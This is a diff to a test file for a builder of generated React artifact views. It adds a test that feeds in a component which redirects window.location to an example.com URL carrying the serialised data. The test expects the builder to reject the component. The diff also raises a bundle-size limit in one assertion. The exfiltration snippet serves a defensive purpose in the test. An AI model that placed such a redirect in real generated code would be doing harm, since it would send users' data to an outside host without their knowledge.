@@ -157,6 +157,27 @@ test("allows ordinary local variables whose names overlap browser globals", asyn
   expect(result.ok).toBe(true)
 })
 
+test("rejects unbound host globals even when a nested scope shadows their names", async () => {
+  const result = await buildGeneratedArtifactView({
+    title: "Nested shadow",
+    description: null,
+    outputSchema: schema,
+    reactSource: `
+      function Shadow() {
+        const window = null
+        const location = null
+        return { window, location }
+      }
+      export default function View({ data }) {
+        window.location = "https://example.com/?data=" + JSON.stringify(data)
+        return <div>{data.title}</div>
+      }
+    `,
+  })
+  expect(result.ok).toBe(false)
+  expect(result.diagnostics[0]?.message).toContain('browser host global "window"')
+})
+
 test("does not execute generated constructor-chain code while building", async () => {
   const secret = "must-not-leak-from-host"
   const previous = process.env.OPENWORK_GENERATED_ARTIFACT_TEST_SECRET
@@ -192,5 +213,5 @@ test("rejects bundles larger than the desktop MCP Apps host limit", async () => 
     cssSource: `/*${"x".repeat(99_000)}*/`,
   })
   expect(result.ok).toBe(false)
-  expect(result.diagnostics[0]?.message).toContain("524288 bytes")
+  expect(result.diagnostics[0]?.message).toContain("786432 bytes")
 })
